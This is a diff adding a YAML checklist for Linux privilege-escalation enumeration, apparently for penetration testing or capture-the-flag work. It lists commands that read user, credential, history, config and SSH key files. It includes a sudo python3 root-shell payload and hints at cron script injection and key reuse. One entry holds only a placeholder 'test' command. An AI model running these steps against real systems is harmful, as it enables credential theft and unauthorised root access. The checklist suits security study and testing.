@@ -1,0 +1,360 @@
+name: Linux PrivEsc Enumeration
+
+steps:
+
+# =========================================================
+# [1] BASIC CONTEXT
+# =========================================================
+- title: Basic Context
+  mode: enum
+  entries:
+
+    - cmd: whoami
+      info: user
+
+    - cmd: id
+      info: groups
+      look_for:
+        - sudo
+        - docker / lxd
+        - adm / disk
+
+    - cmd: hostname
+      info: hostname
+
+    - cmd: sudo -l
+      info: sudo perms
+      look_for:
+        - NOPASSWD
+        - (ALL : ALL) ALL
+      payload: "sudo /usr/bin/python3 -c 'import os; os.system(\"/bin/bash\")'"
+      notes:
+        - check GTFOBins
+
+
+# =========================================================
+# [2] OS & KERNEL
+# =========================================================
+- title: OS & Kernel
+  mode: enum
+  entries:
+
+    - cmd: "cat /etc/os-release"
+      info: os
+
+    - cmd: "uname -a"
+      info: kernel
+      look_for:
+        - outdated kernel
+        - exploit matches
+
+    - cmd: lscpu
+      info: cpu / vm
+
+    - cmd: "cat /etc/shells"
+      info: shells
+      look_for:
+        - uncommon shells
+
+    - cmd: sudo -V
+      info: sudo version
+      look_for:
+        - vulnerable versions    
+
+
+# =========================================================
+# [3] ENVIRONMENT
+# =========================================================
+- title: Environment
+  mode: enum
+  entries:
+
+    - cmd: "echo $PATH"
+      info: path
+      look_for:
+        - writable dirs
+
+    - cmd: env
+      info: env vars
+      look_for:
+        - creds
+        - tokens
+
+
+# =========================================================
+# [4] NETWORK
+# =========================================================
+- title: Network
+  mode: enum
+  entries:
+
+    - cmd: ip a
+      info: interfaces
+
+    - cmd: ifconfig
+      info: interfaces (alt)
+
+    - cmd: route
+      info: routes
+      
+    - cmd: "cat /etc/hosts"  
+      info: hosts
+
+    - cmd: netstat -rn
+      info: routes (alt)
+
+    - cmd: cat /etc/resolv.conf
+      info: dns
+      look_for:
+        - internal domains
+
+    - cmd: arp -a
+      info: arp
+
+
+# =========================================================
+# [5] Services & Processes
+# =========================================================
+- title: Services & Processes
+  mode: enum
+  entries:    
+    
+    - cmd: "find /proc -name cmdline -exec cat {} \\; 2>/dev/null | tr \" \" \"\\n\""
+      info: process args
+      look_for:
+        - credentials
+        - tokens
+        - passwords
+
+    - cmd: "ps aux | grep root"
+      info: root processes
+      look_for:
+        - custom services
+        - scripts
+        - creds in args    
+
+# =========================================================
+# [6] Scheduled Tasks
+# =========================================================
+- title: Scheduled Tasks
+  mode: enum
+  entries:       
+    
+    
+    - cmd: "ls -la /etc/cron.daily/"
+      info: daily cron
+      look_for:
+        - writable scripts
+        - unusual jobs
+      payload:
+        - script injection
+
+
+# =========================================================
+# [7] STORAGE & MOUNTS
+# =========================================================
+- title: Storage & Mounts
+  mode: enum
+  entries:
+
+    - cmd: lsblk
+      info: disks
+      look_for:
+        - extra drives
+
+    - cmd: df -h
+      info: mounts
+
+    - cmd: "cat /etc/fstab"
+      info: fstab
+      look_for:
+        - creds
+
+    - cmd: "cat /etc/fstab | grep -v \"#\" | column -t"
+      info: fstab clean
+
+
+# =========================================================
+# [8] USERS & GROUPS
+# =========================================================
+- title: Users & Groups
+  mode: enum
+  entries:
+
+    - cmd: "cat /etc/passwd"
+      info: users
+
+    - cmd: "cat /etc/passwd | cut -f1 -d:"
+      info: usernames
+
+    - cmd: "grep \"sh$\" /etc/passwd"
+      info: shell users
+
+    - cmd: cat /etc/group
+      info: groups
+
+    - cmd: "getent group sudo"
+      info: sudo users
+
+    - cmd: ls /home
+      info: home dirs
+
+    - cmd: lastlog
+      info: last logins
+      look_for:
+        - active users
+        - never logged in users
+      notes:
+        - helps identify valid targets
+        - inactive accounts often weak
+      
+      
+
+
+# =========================================================
+# [9] CREDENTIALS
+# =========================================================
+- title: Credentials
+  mode: enum
+  entries:
+
+    - cmd: "cat ~/.bash_history"
+      info: history
+      look_for:
+        - passwords
+        - ssh / sudo usage
+
+
+    - cmd: history
+      info: shell history
+      look_for:
+        - passwords
+        - sudo usage
+        - ssh commands
+      notes:
+        - may be truncated    
+
+
+
+    - cmd: "find / -type f \\( -name *_hist -o -name *_history \\) -exec ls -l {} \\; 2>/dev/null"
+      info: history files
+      look_for:
+        - other user histories
+        - readable files
+
+    - cmd: "find / -type f \\( -name *.conf -o -name *.config \\) -exec ls -l {} \\; 2>/dev/null"
+      info: config files
+      look_for:
+        - creds
+        - db connections    
+
+
+    - cmd: "grep 'DB_USER\\|DB_PASSWORD' wp-config.php"
+      info: wp creds
+      look_for:
+        - db username
+        - db password
+      notes:
+        - often reused creds
+        - may allow ssh/sudo reuse    
+    
+    - cmd: "find / ! -path \"*/proc/*\" -iname \"*config*\" -type f 2>/dev/null"
+      info: config search
+      look_for:
+        - creds
+        - api keys
+        - db connections
+      notes:
+        - noisy but high value
+
+    - cmd: "ls ~/.ssh"
+      info: ssh files
+      look_for:
+        - id_rsa
+        - authorized_keys
+        - known_hosts
+      payload:
+        - use private key for ssh
+      notes:
+        - check perms + readability    
+
+# =========================================================
+# [10] HIDDEN & TEMP FILES
+# =========================================================
+- title: Hidden & Temp Files
+  mode: enum
+  entries:
+
+    - cmd: "find / -type f -name \".*\" -exec ls -l {} \\; 2>/dev/null"
+      info: hidden files
+
+    - cmd: "find / -type d -name \".*\" -ls 2>/dev/null"
+      info: hidden dirs
+
+    - cmd: "ls -l /tmp /var/tmp /dev/shm"
+      info: temp dirs
+      look_for:
+        - writable files
+        - scripts
+
+
+# =========================================================
+# [11] Interesting Files (SUID / Capabilities / Writable)
+# =========================================================
+- title: Interesting Files (SUID / Capabilities / Writable)
+  mode: enum
+  entries:
+   
+    - cmd: "test"
+      info: packages
+      look_for:
+        - outdated software
+        - known vulns  
+
+    - cmd: "ls -l /bin /usr/bin/ /usr/sbin/"
+      info: binaries
+      look_for:
+        - unusual perms
+        - custom binaries    
+
+    - cmd: "for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q \"$i\" installed_pkgs.list; then echo \"Check for GTFO: $i\";fi; done"
+      info: gtfobins match
+      look_for:
+        - exploitable binaries
+      payload:
+        - privilege escalation via gtfobins
+      notes:
+        - requires internet + jq
+
+    - cmd: "find / -type f -name \"*.sh\" 2>/dev/null | grep -v \"src\\|snap\\|share\""
+      info: scripts
+      look_for:
+        - writable scripts
+        - cron targets
+      payload:
+        - script modification    
+
+# =========================================================
+# [12] Installed Software
+# =========================================================
+- title: Installed Software
+  mode: enum
+  entries:
+
+    - cmd: "apt list --installed | tr \"/\" \" \" | cut -d\" \" -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list"
+      info: packages
+      look_for:
+        - outdated software
+        - known vulns  
+
+
+
+# =========================================================
+# [13] MISC
+# =========================================================
+- title: Misc
+  mode: enum
+  entries:
+
+    - cmd: lpstat
+      info: printers
